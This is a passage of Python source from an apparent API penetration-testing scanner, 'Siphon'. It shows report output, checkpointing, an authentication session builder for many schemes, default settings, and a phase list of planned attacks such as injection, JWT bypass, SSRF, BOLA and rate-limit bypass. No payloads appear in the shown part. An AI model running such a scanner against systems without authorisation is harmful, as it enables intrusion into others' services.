            writer = csv.DictWriter(fh, fieldnames=fields, extrasaction="ignore")
            writer.writeheader()
            writer.writerows(self.findings)
        return path

    def save_text(self, filename: str = "siphon_output.txt") -> Path:
        path = self.out_dir / filename
        lines = [
            f"Siphon API Penetration Testing Report",
            f"Generated : {datetime.now(timezone.utc).isoformat()}",
            f"Version   : {VERSION}",
            "=" * 60,
        ]
        counts = self.count_by_severity()
        lines.append("\nSummary:")
        for sev in self.SEVERITIES:
            lines.append(f"  {sev:<10}: {counts[sev]}")
        lines.append("\nFindings:")
        lines.append("-" * 60)
        for f in self.findings:
            lines += [
                f"\n[{f['id']}] {f['severity']} — {f['title']}",
                f"  Phase    : {f['phase']}",
                f"  URL      : {f['url']}",
                f"  Detail   : {f['detail']}",
            ]
            if f.get("evidence"):
                lines.append(f"  Evidence : {f['evidence']}")
            if f.get("remediation"):
                lines.append(f"  Fix      : {f['remediation']}")
        path.write_text("\n".join(lines))
        return path

    def save_inventory(self, inventory: list, filename: str = "api_inventory.json") -> Path:
        path = self.out_dir / filename
        path.write_text(json.dumps(inventory, indent=2))
        return path

    def save_api_map(self, api_map: dict, filename: str = "api_map.json") -> Path:
        """Persist the endpoint structure map to api_map.json."""
        path = self.out_dir / filename
        path.write_text(json.dumps(api_map, indent=2))
        return path

    def save_all(self, inventory: list | None = None) -> None:
        self.save_json()
        self.save_csv()
        self.save_text()
        if inventory:
            self.save_inventory(inventory)
        # Update and persist api_map if one was built during discovery
        if hasattr(self, "_api_map") and self._api_map:
            auth_cfg = None
            # Try to get auth_cfg from settings stashed on output
            if hasattr(self, "_auth_cfg"):
                auth_cfg = self._auth_cfg
            updated_map = update_api_map_from_findings(
                dict(self._api_map), self.findings, auth_cfg
            )
            self.save_api_map(updated_map)
        self.write_summary()

    def print_summary(self) -> None:
        counts = self.count_by_severity()
        elapsed = (datetime.now(timezone.utc) - self._start_time).total_seconds()
        con.section("Scan Complete")
        con.info(f"Duration : {elapsed:.1f}s")
        con.info(f"Findings : {len(self.findings)} total")
        for sev in self.SEVERITIES:
            if counts[sev]:
                con.log(f"  {sev:<10}: {counts[sev]}", sev)
        con.info(f"Output   : {self.out_dir}/")


# ---------------------------------------------------------------------------
# Checkpoint / progress manager
# ---------------------------------------------------------------------------

class ProgressManager:
    """Thread-safe checkpoint manager for scan recovery (mirrors Fracture pattern)."""

    def __init__(self, checkpoint_file: "str | Path") -> None:
        self._file  = Path(checkpoint_file)
        self._lock  = threading.Lock()
        self._state = self._load()

    def _load(self) -> dict:
        if self._file.exists():
            try:
                data = json.loads(self._file.read_text(encoding="utf-8"))
                data.setdefault("version", 1)
                data.setdefault("started", datetime.now().isoformat())
                data.setdefault("completed_phases", [])
                data.setdefault("phase_status", {})
                return data
            except Exception:
                pass
        return {
            "version":          1,
            "started":          datetime.now().isoformat(),
            "completed_phases": [],
            "phase_status":     {},
        }

    def _save(self) -> None:
        self._file.parent.mkdir(parents=True, exist_ok=True)
        fd, tmp = tempfile.mkstemp(dir=str(self._file.parent), suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(self._state, f, indent=2)
            os.replace(tmp, str(self._file))
        except Exception:
            try:
                os.unlink(tmp)
            except Exception:
                pass

    def is_phase_complete(self, phase: str) -> bool:
        with self._lock:
            return phase in self._state.get("completed_phases", [])

    def set_phase_status(self, phase: str, status: str,
                         label: str = "", detail: str = "") -> None:
        with self._lock:
            self._state.setdefault("phase_status", {})[phase] = {
                "status":     status,
                "label":      label or phase,
                "detail":     detail,
                "updated_at": datetime.now().isoformat(),
            }
            if status == "complete":
                lst = self._state.setdefault("completed_phases", [])
                if phase not in lst:
                    lst.append(phase)
            self._save()

    def get_state(self) -> dict:
        with self._lock:
            return dict(self._state)


# ---------------------------------------------------------------------------
# Signal handling
# ---------------------------------------------------------------------------

_shutdown_requested = False


def _install_signal_handlers() -> None:
    def _handler(sig, frame):
        global _shutdown_requested
        _shutdown_requested = True
        con.err("\n[siphon] Interrupted — saving partial results …")
    signal.signal(signal.SIGINT, _handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _handler)


# ---------------------------------------------------------------------------
# HTTP session helpers
# ---------------------------------------------------------------------------

def _make_session(settings: dict) -> requests.Session:
    scan = settings.get("scan", {})
    sess = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    )
    adapter = HTTPAdapter(max_retries=retry)
    sess.mount("http://", adapter)
    sess.mount("https://", adapter)
    sess.verify = scan.get("verify_ssl", False)
    proxy = scan.get("proxy", "")
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    ua = scan.get("user_agent", f"Mozilla/5.0 (compatible; Siphon/{VERSION}; Security Assessment)")
    sess.headers.update({"User-Agent": ua})
    extra_hdrs = scan.get("extra_headers", {})
    if extra_hdrs:
        sess.headers.update(extra_hdrs)
    return sess


def _build_auth_session(settings: dict, auth_key: str = "auth") -> requests.Session | None:
    import base64 as _b64
    import hashlib as _hashlib
    import hmac as _hmac
    import struct as _struct
    import time as _time
    import urllib.parse as _urlparse
    from datetime import datetime as _datetime, timezone as _timezone

    scan = settings.get("scan", {})
    auth_cfg = scan.get(auth_key, {})
    if not auth_cfg.get("enabled", False):
        return None
    sess = _make_session(settings)
    timeout = scan.get("timeout", 10)

    # Resolve method: new "method" field takes precedence; fall back to legacy "auth_type"
    method = (auth_cfg.get("method") or auth_cfg.get("auth_type") or "bearer").strip().lower()

    def _csrf_prefetch_internal(login_url: str) -> tuple[str, str]:
        """GET login page, extract CSRF token. Returns (token, post_url)."""
        csrf_field  = auth_cfg.get("csrf_field", "")
        csrf_header = auth_cfg.get("csrf_header", "")
        if not csrf_field and not csrf_header:
            return "", login_url
        try:
            import re as _re
            resp = sess.get(login_url, timeout=timeout)
            body = resp.text
            if csrf_field:
                pat = _re.compile(
                    rf'<input[^>]+name=["\']?{_re.escape(csrf_field)}["\']?[^>]+value=["\']([^"\']+)["\']',
                    _re.IGNORECASE,
                )
                m = pat.search(body)
                if not m:
                    pat2 = _re.compile(
                        rf'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']?{_re.escape(csrf_field)}["\']?',
                        _re.IGNORECASE,
                    )
                    m = pat2.search(body)
                if m:
                    return m.group(1), resp.url
            if csrf_header:
                hval = resp.headers.get(csrf_header, "")
                if hval:
                    return hval, resp.url
            for ck in sess.cookies:
                if "csrf" in ck.name.lower() or "xsrf" in ck.name.lower():
                    return ck.value, resp.url
        except Exception:
            pass
        return "", login_url

    def _login_post(url: str) -> "requests.Response | None":
        csrf_field  = auth_cfg.get("csrf_field", "")
        csrf_header = auth_cfg.get("csrf_header", "")
        post_url    = url
        csrf_token  = ""
        if csrf_field or csrf_header:
            csrf_token, post_url = _csrf_prefetch_internal(url)
        if not post_url:
            post_url = url

        login_mode = auth_cfg.get("login_mode", "merge")
        uf = auth_cfg.get("login_username_field", "username")
        pf = auth_cfg.get("login_password_field", "password")
        u  = auth_cfg.get("username", "")
        p  = auth_cfg.get("password", "")
        if login_mode == "fields":
            data: dict = {}
            if u: data[uf] = u
            if p: data[pf] = p
            if csrf_token and csrf_field: data[csrf_field] = csrf_token
        elif login_mode == "json":
            raw = auth_cfg.get("login_data", "{}")
            try:
                data = json.loads(raw) if isinstance(raw, str) else dict(raw)
            except Exception:
                data = {}
        else:
            raw = auth_cfg.get("login_data", "{}")
            try:
                data = json.loads(raw) if isinstance(raw, str) else dict(raw)
            except Exception:
                data = {}
            if u and uf not in data: data[uf] = u
            if p and pf not in data: data[pf] = p
            if csrf_token and csrf_field and csrf_field not in data:
                data[csrf_field] = csrf_token
        ct = auth_cfg.get("login_content_type", "application/json")
        try:
            if csrf_header and csrf_token:
                sess.headers[csrf_header] = csrf_token
            if "json" in ct:
                return sess.post(post_url, json=data, timeout=timeout)
            return sess.post(post_url, data=data, timeout=timeout)
        except Exception as exc:
            con.err(f"Login POST to {url} failed: {exc}")
            return None

    # ── Bearer ────────────────────────────────────────────────────────────────
    if method == "bearer":
        token = auth_cfg.get("auth_token", "").strip()
        if token:
            sess.headers["Authorization"] = f"{auth_cfg.get('token_type', 'Bearer')} {token}"

    # ── JWT Bearer ────────────────────────────────────────────────────────────
    elif method == "jwt_bearer":
        token = auth_cfg.get("auth_token", "").strip()
        if token:
            sess.headers["Authorization"] = f"Bearer {token}"
        elif auth_cfg.get("login_url"):
            # No pre-issued token — obtain one by POSTing credentials (same as token_login)
            resp = _login_post(auth_cfg["login_url"])
            if resp is not None:
                try:
                    body = resp.json()
                    token_path = auth_cfg.get("login_token_path", "access_token")
                    tok: "str | None" = body
                    for key in token_path.split("."):
                        tok = tok.get(key) if isinstance(tok, dict) else None  # type: ignore[union-attr]
                    if not tok or not isinstance(tok, str):
                        for key in ("access_token", "token", "jwt", "id_token", "auth_token"):
                            if isinstance(body, dict) and key in body:
                                tok = body[key]
                                break
                    if tok and isinstance(tok, str):
                        sess.headers["Authorization"] = f"Bearer {tok}"
                except Exception:
                    pass

    # ── Basic ─────────────────────────────────────────────────────────────────
    elif method in ("basic", "token"):  # "token" is legacy alias
        if method == "token":
            token = auth_cfg.get("auth_token", "").strip()
            if token:
                sess.headers["Authorization"] = f"{auth_cfg.get('token_type', 'Bearer')} {token}"
                return sess
            cookie = auth_cfg.get("session_cookie", "").strip()
            if cookie:
                for part in cookie.split(";"):
                    part = part.strip()
                    if "=" in part:
                        k, v = part.split("=", 1)
                        sess.cookies.set(k.strip(), v.strip())
        else:
            username = auth_cfg.get("username", "")
            password = auth_cfg.get("password", "")
            if username:
                sess.auth = (username, password)

    # ── Digest ────────────────────────────────────────────────────────────────
    elif method == "digest":
        from requests.auth import HTTPDigestAuth
        username = auth_cfg.get("username", "")
        password = auth_cfg.get("password", "")
        if username:
            sess.auth = HTTPDigestAuth(username, password)

    # ── NTLM ──────────────────────────────────────────────────────────────────
    elif method == "ntlm":
        username = auth_cfg.get("username", "")
        password = auth_cfg.get("password", "")
        domain   = auth_cfg.get("domain", "")
        if username:
            try:
                from requests_ntlm import HttpNtlmAuth  # type: ignore[import]
                ntlm_user = f"{domain}\\{username}" if domain else username
                sess.auth = HttpNtlmAuth(ntlm_user, password)
            except ImportError:
                con.err("NTLM auth requires: pip install requests-ntlm")

    # ── NTLMv2 ────────────────────────────────────────────────────────────────
    elif method == "ntlm_v2":
        username = auth_cfg.get("username", "")
        password = auth_cfg.get("password", "")
        domain   = auth_cfg.get("domain", "")
        if username:
            try:
                from requests_ntlm import HttpNtlmAuth  # type: ignore[import]
                ntlm_user = f"{domain}\\{username}" if domain else username
                sess.auth = HttpNtlmAuth(ntlm_user, password, send_cbt=True)
            except ImportError:
                con.err("NTLMv2 auth requires: pip install requests-ntlm")

    # ── Kerberos ──────────────────────────────────────────────────────────────
    elif method == "kerberos":
        try:
            from requests_kerberos import HTTPKerberosAuth, REQUIRED  # type: ignore[import]
            principal = auth_cfg.get("kerberos_principal", "")
            sess.auth  = HTTPKerberosAuth(
                mutual_authentication=REQUIRED,
                principal=principal or None,
            )
        except ImportError:
            con.err("Kerberos auth requires: pip install requests-kerberos")

    # ── Kerberos Delegation ───────────────────────────────────────────────────
    elif method == "kerberos_delegation":
        try:
            from requests_kerberos import HTTPKerberosAuth, REQUIRED  # type: ignore[import]
            principal = auth_cfg.get("kerberos_principal", "")
            sess.auth  = HTTPKerberosAuth(
                mutual_authentication=REQUIRED,
                delegate=True,
                principal=principal or None,
            )
        except ImportError:
            con.err("Kerberos delegation requires: pip install requests-kerberos")

    # ── OAuth2 Client Credentials ─────────────────────────────────────────────
    elif method == "oauth2_client_creds":
        token_url     = auth_cfg.get("oauth_token_url", "")
        client_id     = auth_cfg.get("oauth_client_id", "")
        client_secret = auth_cfg.get("oauth_client_secret", "")
        scope         = auth_cfg.get("oauth_scope", "")
        if token_url and client_id:
            data: dict = {
                "grant_type":    "client_credentials",
                "client_id":     client_id,
                "client_secret": client_secret,
            }
            if scope: data["scope"] = scope
            try:
                resp = sess.post(token_url, data=data, timeout=timeout)
                body = resp.json()
                token = body.get("access_token", "")
                if token:
                    token_type = body.get("token_type", "Bearer")
                    sess.headers["Authorization"] = f"{token_type} {token}"
            except Exception as exc:
                con.err(f"OAuth2 client_credentials failed: {exc}")

    # ── OAuth2 Password ───────────────────────────────────────────────────────
    elif method == "oauth2_password":
        token_url     = auth_cfg.get("oauth_token_url", "")
        client_id     = auth_cfg.get("oauth_client_id", "")
        client_secret = auth_cfg.get("oauth_client_secret", "")
        scope         = auth_cfg.get("oauth_scope", "")
        username      = auth_cfg.get("username", "")
        password      = auth_cfg.get("password", "")
        if token_url and username:
            data = {"grant_type": "password", "username": username, "password": password}
            if client_id:     data["client_id"]     = client_id
            if client_secret: data["client_secret"] = client_secret
            if scope:         data["scope"]         = scope
            try:
                resp = sess.post(token_url, data=data, timeout=timeout)
                body = resp.json()
                token = body.get("access_token", "")
                if token:
                    token_type = body.get("token_type", "Bearer")
                    sess.headers["Authorization"] = f"{token_type} {token}"
            except Exception as exc:
                con.err(f"OAuth2 password flow failed: {exc}")

    # ── OAuth 1.0a ────────────────────────────────────────────────────────────
    elif method == "oauth1a":
        try:
            from requests_oauthlib import OAuth1  # type: ignore[import]
            ck = auth_cfg.get("oauth1_consumer_key", "")
            cs = auth_cfg.get("oauth1_consumer_secret", "")
            tk = auth_cfg.get("oauth1_token", "") or None
            ts = auth_cfg.get("oauth1_token_secret", "") or None
            if ck:
                sess.auth = OAuth1(ck, cs, tk, ts, signature_method="HMAC-SHA1")
        except ImportError:
            con.err("OAuth1a requires: pip install requests-oauthlib")

    # ── OIDC Token ────────────────────────────────────────────────────────────
    elif method == "oidc_token":
        id_token = (auth_cfg.get("oidc_id_token") or auth_cfg.get("auth_token") or "").strip()
        if id_token:
            sess.headers["Authorization"] = f"Bearer {id_token}"
        else:
            token_url = auth_cfg.get("oauth_token_url", "")
            client_id = auth_cfg.get("oauth_client_id", "")
            client_secret = auth_cfg.get("oauth_client_secret", "")
            scope = auth_cfg.get("oauth_scope", "openid")
            if token_url and client_id:
                data = {
                    "grant_type": "client_credentials",
                    "client_id": client_id,
                    "client_secret": client_secret,
                    "scope": scope,
                }
                try:
                    resp = sess.post(token_url, data=data, timeout=timeout)
                    body = resp.json()
                    tok = body.get("id_token", body.get("access_token", ""))
                    if tok:
                        sess.headers["Authorization"] = f"Bearer {tok}"
                except Exception as exc:
                    con.err(f"OIDC token request failed: {exc}")

    # ── SAML Assertion ────────────────────────────────────────────────────────
    elif method == "saml_assertion":
        assertion = auth_cfg.get("saml_assertion", "").strip()
        token_url = auth_cfg.get("saml_token_url", "").strip()
        if assertion and token_url:
            data = {
                "grant_type": "urn:ietf:params:oauth:grant-type:saml2-bearer",
                "assertion":  _b64.b64encode(assertion.encode()).decode(),
            }
            client_id = auth_cfg.get("oauth_client_id", "")
            if client_id: data["client_id"] = client_id
            try:
                resp = sess.post(token_url, data=data, timeout=timeout)
                body = resp.json()
                token = body.get("access_token", "")
                if token:
                    sess.headers["Authorization"] = f"Bearer {token}"
            except Exception as exc:
                con.err(f"SAML assertion exchange failed: {exc}")
        elif assertion:
            hdr = auth_cfg.get("saml_assertion_header", "Authorization")
            sess.headers[hdr] = f"SAML {assertion}"

    # ── Mutual TLS ────────────────────────────────────────────────────────────
    elif method == "mtls":
        cert_file = auth_cfg.get("mtls_cert", "")
        key_file  = auth_cfg.get("mtls_key", "")
        if cert_file and key_file:
            sess.cert = (cert_file, key_file)
            ca_bundle = auth_cfg.get("mtls_ca_bundle", "")
            if ca_bundle:
                sess.verify = ca_bundle
        else:
            client_id = auth_cfg.get("username", "").strip()
            if client_id:
                sess.headers["X-Client-Cert"] = client_id

    # ── TOTP MFA ──────────────────────────────────────────────────────────────
    elif method == "totp_mfa":
        login_url   = auth_cfg.get("login_url", "")
        totp_secret = auth_cfg.get("totp_secret", "").strip().replace(" ", "").upper()
        if login_url and totp_secret:
            try:
                key  = _b64.b32decode(totp_secret)
                step = int(_time.time()) // 30
                msg  = _struct.pack(">Q", step)
                h    = _hmac.new(key, msg, _hashlib.sha1).digest()
                off  = h[-1] & 0x0F
                code = str((_struct.unpack(">I", h[off:off+4])[0] & 0x7FFFFFFF) % 1_000_000).zfill(6)
                totp_field = auth_cfg.get("totp_field", "otp")
                uf = auth_cfg.get("login_username_field", "username")
                pf = auth_cfg.get("login_password_field", "password")
                u  = auth_cfg.get("username", "")
                p  = auth_cfg.get("password", "")
                data = {}
                if u: data[uf] = u
                if p: data[pf] = p
                data[totp_field] = code
                ct = auth_cfg.get("login_content_type", "application/json")
                if "json" in ct:
                    resp = sess.post(login_url, json=data, timeout=timeout)
                else:
                    resp = sess.post(login_url, data=data, timeout=timeout)
                if resp.ok:
                    try:
                        body = resp.json()
                        tok = (
                            body.get("access_token") or body.get("token") or
                            body.get("jwt") or body.get("id_token") or ""
                        )
                        if tok:
                            tt = auth_cfg.get("token_type", "Bearer")
                            sess.headers["Authorization"] = f"{tt} {tok}"
                    except Exception:
                        pass
            except Exception as exc:
                con.err(f"TOTP MFA failed: {exc}")

    # ── API Key (header / query) ───────────────────────────────────────────────
    elif method == "apikey":
        key    = auth_cfg.get("api_key", "").strip()
        header = auth_cfg.get("api_key_header", "X-API-Key")
        if key and header:
            sess.headers[header] = key
        qp = auth_cfg.get("api_key_query", "")
        if key and qp:
            sess.params = {qp: key}  # type: ignore[assignment]

    # ── API Key Cookie ────────────────────────────────────────────────────────
    elif method == "apikey_cookie":
        key         = auth_cfg.get("api_key", "").strip()
        cookie_name = auth_cfg.get("api_key_cookie_name", "api_key")
        domain      = auth_cfg.get("api_key_cookie_domain", "")
        if key:
            sess.cookies.set(cookie_name, key, domain=domain or None)

    # ── Cookie Login ──────────────────────────────────────────────────────────
    elif method == "cookie_login":
        login_url = auth_cfg.get("login_url", "")
        if login_url:
            _login_post(login_url)

    # ── Session Cookie / Form Login (CSRF prefetch + form POST) ──────────────
    elif method in ("session_cookie", "form_login"):
        login_url = auth_cfg.get("login_url", "")
        if login_url:
            orig_ct = auth_cfg.get("login_content_type", "")
            if not orig_ct:
                auth_cfg["login_content_type"] = "application/x-www-form-urlencoded"
            _login_post(login_url)
            if not orig_ct:
                auth_cfg.pop("login_content_type", None)

    # ── Token Login ───────────────────────────────────────────────────────────
    elif method in ("token_login", "form"):
        login_url = auth_cfg.get("login_url", "")
        if login_url:
            resp = _login_post(login_url)
            if resp is not None:
                try:
                    body = resp.json()
                    token_path = auth_cfg.get("login_token_path", "token")
                    token: "str | None" = body
                    for key in token_path.split("."):
                        token = token.get(key) if isinstance(token, dict) else None  # type: ignore[union-attr]
                    if not token or not isinstance(token, str):
                        for key in ("token", "access_token", "jwt", "id_token", "auth_token"):
                            if key in body:
                                token = body[key]
                                break
                    if token and isinstance(token, str):
                        sess.headers["Authorization"] = f"{auth_cfg.get('token_type', 'Bearer')} {token}"
                except Exception:
                    pass

    # ── HMAC Signature ────────────────────────────────────────────────────────
    elif method == "hmac_signature":
        key_id  = auth_cfg.get("hmac_key_id", "")
        secret  = auth_cfg.get("hmac_secret", "")
        algo    = auth_cfg.get("hmac_algorithm", "sha256").lower()
        hdr_fmt = auth_cfg.get("hmac_header", "Authorization")
        if secret:
            _secret_bytes = secret.encode() if isinstance(secret, str) else secret
            _key_id, _algo, _hdr = key_id, algo, hdr_fmt

            class _HmacAuth(requests.auth.AuthBase):  # type: ignore[misc]
                def __call__(self, r):
                    ts   = str(int(_time.time()))
                    meth = r.method.upper()
                    path = _urlparse.urlparse(r.url).path or "/"
                    body = (r.body or b"")
                    if isinstance(body, str): body = body.encode()
                    msg  = f"{meth}\n{path}\n{ts}".encode() + b"\n" + body
                    h    = getattr(_hashlib, _algo, _hashlib.sha256)
                    sig  = _hmac.new(_secret_bytes, msg, h).hexdigest()
                    val  = f'key="{_key_id}",ts="{ts}",sig="{sig}"' if _key_id else f'ts="{ts}",sig="{sig}"'
                    r.headers[_hdr] = f"HMAC {val}"
                    return r

            sess.auth = _HmacAuth()

    # ── AWS SigV4 ─────────────────────────────────────────────────────────────
    elif method == "aws_sigv4":
        access_key = auth_cfg.get("aws_access_key_id", "").strip()
        secret_key = auth_cfg.get("aws_secret_access_key", "").strip()
        region     = auth_cfg.get("aws_region", "us-east-1")
        service    = auth_cfg.get("aws_service", "execute-api")
        session_tk = auth_cfg.get("aws_session_token", "")
        if access_key and secret_key:
            _ak, _sk, _reg, _svc, _stk = access_key, secret_key, region, service, session_tk

            def _sign(key, msg):
                return _hmac.new(key, msg.encode(), _hashlib.sha256).digest()

            def _sig_key(sk, date, reg, svc):
                k = _sign(("AWS4" + sk).encode(), date)
                k = _sign(k, reg)
                k = _sign(k, svc)
                k = _sign(k, "aws4_request")
                return k

            class _SigV4Auth(requests.auth.AuthBase):  # type: ignore[misc]
                def __call__(self, r):
                    t = _datetime.now(tz=_timezone.utc)
                    amz_date   = t.strftime("%Y%m%dT%H%M%SZ")
                    date_stamp = t.strftime("%Y%m%d")
                    parsed  = _urlparse.urlparse(r.url)
                    host    = parsed.netloc
                    path    = parsed.path or "/"
                    body    = r.body or b""
                    if isinstance(body, str): body = body.encode()
                    ph = _hashlib.sha256(body).hexdigest()
                    ch = f"host:{host}\nx-amz-date:{amz_date}\n"
                    sh = "host;x-amz-date"
                    if _stk:
                        ch += f"x-amz-security-token:{_stk}\n"
                        sh += ";x-amz-security-token"
                    cr = "\n".join([r.method, path, parsed.query, ch, sh, ph])
                    cs = f"{date_stamp}/{_reg}/{_svc}/aws4_request"
                    sts = "\n".join(["AWS4-HMAC-SHA256", amz_date, cs,
                                     _hashlib.sha256(cr.encode()).hexdigest()])
                    sig = _hmac.new(_sig_key(_sk, date_stamp, _reg, _svc),
                                    sts.encode(), _hashlib.sha256).hexdigest()
                    r.headers["X-Amz-Date"] = amz_date
                    r.headers["Authorization"] = (
                        f"AWS4-HMAC-SHA256 Credential={_ak}/{cs},"
                        f"SignedHeaders={sh},Signature={sig}"
                    )
                    if _stk:
                        r.headers["X-Amz-Security-Token"] = _stk
                    return r

            sess.auth = _SigV4Auth()

    # ── Custom Headers ────────────────────────────────────────────────────────
    elif method == "header_creds":
        hdrs = auth_cfg.get("custom_headers", {})
        if isinstance(hdrs, dict):
            sess.headers.update(hdrs)

    # ── Proxy Header / Trusted Forwarding ────────────────────────────────────
    elif method == "proxy_header":
        hname = auth_cfg.get("proxy_header", auth_cfg.get("proxy_header_name", "X-Forwarded-User"))
        hval  = auth_cfg.get("proxy_header_value", auth_cfg.get("username", ""))
        if hname and hval:
            sess.headers[hname] = hval

    # ── WebAuthn probe ────────────────────────────────────────────────────────
    elif method == "webauthn_probe":
        sess.headers["X-WebAuthn-Token"] = "1"

    return sess


def _parse_target(target: str) -> dict:
    """Parse and normalize an API base URL."""
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    parsed = urlparse(target)
    return {
        "url":      target.rstrip("/"),
        "scheme":   parsed.scheme,
        "host":     parsed.hostname or "",
        "port":     parsed.port or (443 if parsed.scheme == "https" else 80),
        "path":     parsed.path.rstrip("/"),
        "netloc":   parsed.netloc,
    }


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

BANNER = r"""
  ███████╗██╗██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗
  ██╔════╝██║██╔══██╗██║  ██║██╔═══██╗████╗  ██║
  ███████╗██║██████╔╝███████║██║   ██║██╔██╗ ██║
  ╚════██║██║██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║
  ███████║██║██║     ██║  ██║╚██████╔╝██║ ╚████║
  ╚══════╝╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
"""

# ---------------------------------------------------------------------------
# DEFAULT_SETTINGS
# ---------------------------------------------------------------------------

DEFAULT_SETTINGS: dict = {
    "engagement": {
        "consultant":       "",
        "client_name":      "",
        "client_short":     "",
        "consultant_email": "",
        "start_date":       "",
        "end_date":         "",
    },
    "scan": {
        "project":        "",
        "api_base_url":   "",
        "api_base_urls":  [],
        "openapi_url":    "",
        "api_spec_files": [],
        "threads":        _SCAN_CONCURRENCY,
        "timeout":        10,
        "user_agent":     "Mozilla/5.0 (compatible; Siphon/1.0; Security Assessment)",
        "extra_headers":  {},
        "proxy":          "",
        "verify_ssl":     False,
        "phases": {
            "discovery":        True,
            "recon":            True,
            "fuzzing":          True,
            "injection":        True,
            "auth_bypass":      True,
            "rate_limiting":    True,
            "mass_assignment":  True,
            "ssrf":             True,
            "data_exposure":    True,
            "graphql":          False,
            "business_flows":   True,
            "bola":             False,
            "bfla":             False,
            "cross_user":       False,
            "session":          False,
            "jwt":              False,
            "sensitive_files":    True,
            "tls":              True,
            "unsafe_consumption": True,
            "verb_tampering":   True,
            "soap":             True,
            "file_upload_info": True,
            "access_matrix":   False,  # Phase 20: multi-credential access matrix (requires auth_matrix)
        },
        "auth": {
            "enabled":                 False,
            "method":                  "bearer",   # bearer|jwt_bearer|basic|digest|ntlm|ntlm_v2|kerberos|kerberos_delegation|oauth2_client_creds|oauth2_password|oauth1a|oidc_token|saml_assertion|mtls|totp_mfa|apikey|apikey_cookie|cookie_login|session_cookie|form_login|token_login|hmac_signature|aws_sigv4|header_creds
            # Bearer / JWT
            "auth_token":              "",
            "token_type":              "Bearer",
            # Basic / Digest / NTLM / Kerberos
            "username":                "",
            "password":                "",
            "domain":                  "",         # NTLM/Kerberos domain
            "kerberos_principal":      "",         # Kerberos principal (optional)
            # API Key
            "api_key":                 "",
            "api_key_header":          "X-API-Key",
            "api_key_query":           "",         # query-param name (alternative to header)
            "api_key_cookie_name":     "api_key",  # cookie name for apikey_cookie
            "api_key_cookie_domain":   "",
            # Login endpoint (cookie_login / session_cookie / token_login / totp_mfa)
            "login_url":               "",
            "login_method":            "POST",
            "login_data":              "{}",
            "login_content_type":      "application/json",
            "login_username_field":    "username",
            "login_password_field":    "password",
            "login_token_path":        "token",    # dot-path into JSON response (token_login)
            # CSRF (session_cookie)
            "csrf_field":              "",         # hidden input field name
            "csrf_header":             "",         # response header / request header name
            # OAuth2 (client_creds, password, oidc_token)
            "oauth_token_url":         "",
            "oauth_client_id":         "",
            "oauth_client_secret":     "",
            "oauth_scope":             "",
            # OAuth 1.0a
            "oauth1_consumer_key":     "",
            "oauth1_consumer_secret":  "",
            "oauth1_token":            "",
            "oauth1_token_secret":     "",
            # OIDC
            "oidc_id_token":           "",         # direct id_token (optional)
            # SAML
            "saml_assertion":          "",         # raw XML assertion
            "saml_token_url":          "",         # exchange endpoint (optional)
            "saml_assertion_header":   "Authorization",
            # mTLS
            "mtls_cert":               "",         # path to PEM client certificate
            "mtls_key":                "",         # path to PEM private key
            "mtls_ca_bundle":          "",         # path to CA bundle (optional)
            # TOTP MFA
            "totp_secret":             "",         # base32 TOTP secret
            "totp_field":              "otp",      # form field name for OTP
            # HMAC Signature
            "hmac_key_id":             "",
            "hmac_secret":             "",
            "hmac_algorithm":          "sha256",
            "hmac_header":             "Authorization",
            # AWS SigV4
            "aws_access_key_id":       "",
            "aws_secret_access_key":   "",
            "aws_region":              "us-east-1",
            "aws_service":             "execute-api",
            "aws_session_token":       "",
            # Custom headers
            "custom_headers":          {},
            # Legacy compat
            "auth_type":               "",
            "session_cookie":          "",
        },
        "auth2": {
            "enabled":        False,
            "method":         "bearer",
            "username":       "",
            "password":       "",
            "auth_token":     "",
            "token_type":     "Bearer",
            "session_cookie": "",
        },
        "auth_matrix": [],   # list of {role, username, password} for multi-cred access matrix
        "jwt_secret":              "",
        "rate_limit_threshold":    50,
        "mass_assignment_fields":  [],
        "tools": {
            "kiterunner":   True,
            "ffuf":         True,
            "feroxbuster":  True,
            "dirsearch":    True,
        },
        "wordlist":            "",
        "max_tool_time":       120,
        "tool_threads":        _SCAN_CONCURRENCY,
        "tool_rate":           50,
    },
}

# ---------------------------------------------------------------------------
# PHASE_LIST
# ---------------------------------------------------------------------------

PHASE_LIST = [
    ("discovery",       "Phase 0:  OpenAPI/Swagger discovery + Kiterunner/FFUF/Feroxbuster/dirsearch"),
    ("recon",           "Phase 1:  API fingerprinting, server headers, CORS, framework detection"),
    ("fuzzing",         "Phase 2:  HTTP method fuzzing, FFUF parameter fuzzing"),
    ("injection",       "Phase 3:  SQLi, NoSQLi, SSTI, XXE, LDAP, XSS, CMDi, CRLF, Path Traversal"),
    ("auth_bypass",     "Phase 4:  JWT algorithm confusion, none-alg, key confusion"),
    ("rate_limiting",   "Phase 5:  Rate limit detection and bypass techniques"),
    ("mass_assignment", "Phase 6:  Mass assignment / over-posting attack testing"),
    ("ssrf",            "Phase 7:  SSRF via API URL parameters"),
    ("data_exposure",   "Phase 8:  Excessive data exposure in API responses"),
    ("graphql",         "Phase 9:  GraphQL introspection and query fuzzing"),
    ("business_flows",  "Phase 9b: Business flow abuse — workflow skip, race conditions, value manipulation (API6)"),
    ("bola",            "Phase 10: BOLA/IDOR — cross-user object access (auth required)"),
    ("bfla",            "Phase 11: BFLA — function-level authorization bypass (auth required)"),
    ("cross_user",      "Phase 12: Cross-user data leakage (auth + auth2 required)"),
    ("session",         "Phase 13: API session / token management analysis (auth required)"),
    ("jwt",             "Phase 14: JWT advanced attacks — jku, kid, HMAC cracking (auth required)"),
    ("sensitive_files", "Phase 15: Sensitive file exposure — .env, config, git, swagger (API9)"),
    ("tls",                 "Phase 16:  TLS/SSL analysis — deprecated protocols, weak ciphers (API8)"),
    ("unsafe_consumption",  "Phase 16b: Unsafe API consumption — webhook SSRF, open redirect, deser (API10)"),
